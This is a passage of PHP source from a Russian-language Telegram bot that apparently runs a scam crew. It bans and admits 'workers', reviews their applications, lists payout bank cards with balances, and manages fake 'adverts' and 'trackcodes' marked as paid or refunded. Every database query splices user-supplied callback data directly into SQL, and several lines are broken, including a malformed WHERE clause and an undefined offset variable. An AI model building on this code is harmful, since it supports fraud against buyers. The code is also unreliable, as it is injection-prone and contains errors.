			if(preg_match('/^\/ban\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 5, -1);


					$search = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` != '-1'");

					if(mysqli_num_rows($search) > 0) {
						mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `card` = '0' WHERE `telegram` = '$user_id'");
						mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");

						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));

						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

						$text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						$text = "🚫 <b>Модератор заблокировал вам доступ к проекту.</b>";
						send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {
						$text = "👽 <b>Пользователь с таким ID не найден или он уже заблокирован</b>";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

			}

			if(preg_match('/^\/unban\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 7, -1);

				$search = mysqli_query($connection, "SELECT `telegram`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");

				if(mysqli_num_rows($search) > 0) {
					$user = mysqli_fetch_assoc($search);

					if($user['access'] <= 0) {
						mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");

						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

						$text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						$text = "♻️ <b>Модератор разблокировал вам доступ к проекту.</b>\n\n";
						$text .= "Можете подать свою заявку в команду, /start";
						send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

						$text = "♻️ <b>Воркер не заблокирован, но был вынесен из черного списка в беседах</b>";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} else {
					$text = "👽 <b>Пользователь с таким ID не найден или он уже заблокирован</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/adverts\/\d+\//', $callback['type'])) {
				$user_id = substr($callback['type'], 9, -1);

				send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getMyAdverts($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyAdverts($user_id, 1, 1)));
			}

			if(preg_match('/\/join\/(\w+\/\d+|\w+\/|)/', $callback['type'])) {
				if($callback['type'] == '/join/') {
					$query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4`, `status` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");

					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);

						if($request['status'] == 1) {
							$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
							$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
							if($request['value4'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n";
							}
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} elseif($request['status'] == 2) {
							$text = "⏱ <b>Ваша заявка находится на проверке у модераторов</b>\n\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(empty($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
							$text = "Откуда вы узнали о нас?";
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
							$text = "Есть ли опыт в подобной сфере, если да, то какой?";
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND isset($request['value2']) AND empty($request['value3'])) {
							$text = "Сколько времени вы готовы уделять работе и какого результата вы хотите добиться?";
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND isset($request['value2']) AND isset($request['value3'])) {
							$text = "Кто вас пригласил?";
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					} else {
						mysqli_query($connection, "INSERT INTO `requests` (`username`, `name`, `telegram`, `rules`, `status`, `time`) VALUES ('$callback[username]', '$callback[firstname] $callback[lastname]', '$callback[from]', '0', '0', '".time()."')");
                                                 $text = "🔰10 ПРАВИЛ 🔰\n\n";
						$text .= "<b>1.</b> Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков).\n";
						$text .= "<b>2.</b> Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы, всякого рода реклама так же запрещена.\n";
						$text .= "<b>3.</b> Запрещено обсуждать других ТСов.\n";
						$text .= "<b>4.</b> Если что-то не устраивает по поводу %, беседы и т.д. пишите Владельцу проекта  , а не разводите флуд в чате.\n";
						$text .= "<b>5.</b> Запрещено узнавать у друг друга персональную информацию.\n";
						$text .= "<b>6.</b> Запрещено оскорблять администрацию.\n";
						$text .= "<b>7.</b> Запрещено попрошайничество в беседе воркеров.\n";
						$text .= "<b>8.</b> Администрация не несёт ответственности за блокировку кошельков/карт.\n";
						$text .= "<b>9.</b> Конфликты между собой решать в лс.\n";
						$text .= "<b>10.</b> Месяц без залётов, будем прощаться.\n";
						$text .= "\nВы подтверждаете, что ознакомились и согласны с условиями и правилами нашего проекта?";
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✅ Полностью согласен', 'callback_data' => '/join/accept/')))));
						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'parse_mode' => 'html', 'text' => $text, 'reply_markup' => $keyboard));
					}
				} elseif($callback['type'] == '/join/accept/') {
					mysqli_query($connection, "UPDATE `requests` SET `rules` = '1' WHERE `telegram` = '$callback[from]' AND `status` = '0'");
						$text .= "<b>1.</b> Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков).\n";
						$text .= "<b>2.</b> Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы, всякого рода реклама так же запрещена.\n";
						$text .= "<b>3.</b> Запрещено обсуждать других ТСов.\n";
						$text .= "<b>4.</b> Если что-то не устраивает по поводу %, беседы и т.д. пишите Владельцу проекта  , а не разводите флуд в чате.\n";
						$text .= "<b>5.</b> Запрещено узнавать у друг друга персональную информацию.\n";
						$text .= "<b>6.</b> Запрещено оскорблять администрацию.\n";
						$text .= "<b>7.</b> Запрещено попрошайничество в беседе воркеров.\n";
						$text .= "<b>8.</b> Администрация не несёт ответственности за блокировку кошельков/карт.\n";
						$text .= "<b>9.</b> Конфликты между собой решать в лс.\n";
						$text .= "<b>10.</b> Месяц без залётов, будем прощаться.\n";
					$text .= "\n✅ Вы приняли наши правила";
					send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'reply_markup' => ''));
					$text = "Откуда вы узнали о нас?";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					$text = "➕ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>начал заполнение заявки в команду</b>\n";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} elseif($callback['type'] == '/join/send/') {
					$query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` = '1' ORDER BY `id` DESC");

					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);
						mysqli_query($connection, "UPDATE `requests` SET `status` = '2' WHERE `id` = '$request[id]'");
						$text = "🐣 <b>Новая заявка в команду</b>\n\n";
						$text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a>\n";
						$text .= "<b>Telegram ID:</b> <code>$callback[from]</code>\n";
						$text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
						$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
						$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
						if($request['value4'] == 0) {
							$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
						} else {
							$text .= "<b>Кто пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
						}
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Одобрить', 'callback_data' => '/join/approve/'.$request['id']), Array('text' => '❌ Отклонить', 'callback_data' => '/join/reject/'.$request['id'])))));
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						$text = "💌 <b>Ваша заявка была отправлена модераторам</b>\n\n";
						$text .= "Ответ вам придёт после решения модераторов\n";
						send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						$text = "➕ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отправил свою заявку на проверку модераторам</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} elseif($callback['type'] == '/join/cancel/') {
					$query = mysqli_query($connection, "SELECT `id` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");

					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);

						mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request[id]'");
						$text = "🗑 <b>Ваша заявка была удалена</b>";
						send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						$text = "🗑 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отменил свою заявку в команду</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} elseif(preg_match('/\/join\/approve\/\d{0,9}/', $callback['type'])) {
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");

					if(mysqli_num_rows($isAccess) > 0) {
						$request_id = substr($callback['type'], 14);

						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';

						$query = mysqli_query($connection, "SELECT `username`, `name`, `telegram`, `value1`, `value2`, `value3`, `value4`, `msg` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");

						if(mysqli_num_rows($query) > 0) {
							$request = mysqli_fetch_assoc($query);
							$users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$request[telegram]'");
							$msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
							if(mysqli_num_rows($users) > 0) {
								mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
								mysqli_query($connection, "UPDATE `accounts` SET `username` = '$request[username]', `access` = '1', `stake` = '$settings[stake]', `card` = '0' WHERE `telegram` = '$request[telegram]'");
							} else {
								mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
								mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `wallet`, `access`, `stake`, `card`, `inviter`, `created`) VALUES ('$request[username]', '$request[telegram]', '0', '1', '$settings[stake]', '0', '$request[value4]', '".time()."')");
							}

							send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $request['telegram']));
							send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $request['telegram']));

							#if($request['value4'] != 0) {
							#	$text = "👔 <b>У вас новый реферал</b>";
							#	send($config['token'], 'sendMessage', Array('chat_id' => $request['value4'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							#}

							$text = "🐣 <b>Новая заявка в команду</b>\n\n";
							$text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
							$text .= "<b>Telegram ID:</b> <code>$request[telegram]</code>\n";
							$text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
							if($request['value4'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
							}
							$text .= "<b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>одобрил заявку</b>";
							send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							$text = "🙂 <b>Модераторы одобрили вашу заявку</b>\n\n";
							$text .= "Теперь вам доступен дополнительный функционал бота!\n\n";
							$text .= "Введите /help, чтобы отобразить список команд\n";
							$text .= "<b>Чат воркеров:</b>" . $config['invites']['workers'];
							$keyboard = json_encode(Array('keyboard' => Array(Array('👤 Профиль', '🔰️ Сайты', '🔗 Мои ссылки'), Array('⚙️ Инструменты', '❓ Помощь'), Array('📅 Статистика')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
							send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							$text = "➕ <b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>принял заявку в команду от </b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				} elseif(preg_match('/\/join\/reject\/\d{0,9}/', $callback['type'])) {
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");

					if(mysqli_num_rows($isAccess) > 0) {
						$request_id = substr($callback['type'], 13);

						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';

						$query = mysqli_query($connection, "SELECT `name`, `telegram`, `value1`, `value2`, `value3`, `value4`, `msg` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");

						if(mysqli_num_rows($query) > 0) {
							$request = mysqli_fetch_assoc($query);
							$msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
							mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request_id'");
							$text = "🐣 <b>Новая заявка в команду</b>\n\n";
							$text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
							$text .= "<b>Telegram ID:</b> <code>$request[telegram]</code>\n";
							$text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
							if($request['value4'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
							}
							$text .= "<b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отклонил заявку</b>\n";

							send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							$text = "🙁 <b>Модераторы отклонили вашу заявку</b>\n\n";
							$text .= "Попробуйте подать заявку в следующий раз\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "➕ <b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отклонил заявку в команду от </b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}
			}


			if(preg_match('/(\/cards\/\d{1,2}\/)/', $callback['type'])) {
				$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '666'");

				if(mysqli_num_rows($isAccess) > 0) {
					$cur_page = mb_substr($callback['type'], 7, -1);

					$pages = ceil(mysqli_num_rows($query)/10);

					$offset = $cur_page-1;
					$back = $cur_page-1;
					$next = $cur_page+1;

					if($pages == $cur_page) $offset = 0;
					if($pages == $cur_page) $next = 0; $back = $pages-1;

					$i = 0;
					$text = "💳 <b>Информация о загруженных картах</b>\n\n";
					$cards = mysqli_query($connection, "SELECT `amount`, `totalAmount`, `status`, `verify`, `number` FROM `cards` WHERE `status` = '1' ORDER BY `totalAmount` DESC LIMIT 10 OFFSET $offset0");

					while($row = mysqli_fetch_assoc($cards)) {
						$i = $i+1;
						$users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `card` = '$row[number]' AND `access` > '0'");
						if($row['verify'] == 1) $status = '✅';
						if($row['verify'] == 0) $status = '❌';
						if($settings['card'] == $row['number']) $i = '💎';
						$text .= $i.". — <code>$row[number]</code> | Статус: $status | Баланс: <code>$row[amount] руб.</code>\nПринято: <code>$row[totalAmount] руб.</code> | Используют: <code>".Endings(mysqli_num_rows($users), "воркер", "воркера", "воркеров")."</code>\n";
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '⬅️ Назад', 'callback_data' => '/cards/'.$back.'/'), Array('text' => 'Далее ➡️', 'callback_data' => '/cards/'.$next.'/')))));
					}

					send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
				}
			}

			if(preg_match('/\/trackcode\/\d{6,12}\//', $callback['type'])) {
				$code = mb_substr($callback['type'], 11, -1);

				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getTrack($callback['from'], $code, 1)));
			}

			if(preg_match('/^\/getcard\/$/', $callback['type']) == TRUE) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => getCard(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}

			if(preg_match('/\/advert\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
				$advert_id = mb_substr($callback['type'], 8, -1);

				send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
			}

			if(preg_match('/\/hide\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
				$advert_id = mb_substr($callback['type'], 6, -1);
				mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");

				send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
			}

			if(preg_match('/\/show\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
				$advert_id = mb_substr($callback['type'], 6, -1);
				mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '".time()."' WHERE `advert_id` = '$advert_id'");

				send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
				$text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил своё объявление</b>\n\n";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

			}

			if(preg_match('/\/trackshow\/\d{6,12}\//', $callback['type'])) {
				$code = substr($callback['type'], 11, -1);

				$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` = '-1'");

				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1' WHERE `code` = '$code', `time` = '".time()."' AND `worker` = '$callback[from]' AND `status` = '-1'");

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
					$text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил свой трек-код</b> <code>$code</code>\n\n";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/trackwait\/\d{6,12}\//', $callback['type'])) {
				$code = substr($callback['type'], 11, -1);

				$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
					$text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Ожидает оплаты</code>";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/trackpay\/\d{6,12}\//', $callback['type'])) {
				$code = substr($callback['type'], 10, -1);

				$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '2' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
					$text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Оплачено</code>";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/trackref\/\d{6,12}\//', $callback['type'])) {
				$code = substr($callback['type'], 10, -1);

				$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '3' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
					$text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Возврат средств</code>";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/restrack\/\d{6,12}\//', $callback['type']) == TRUE) {
				$code = substr($callback['type'], 10, -1);

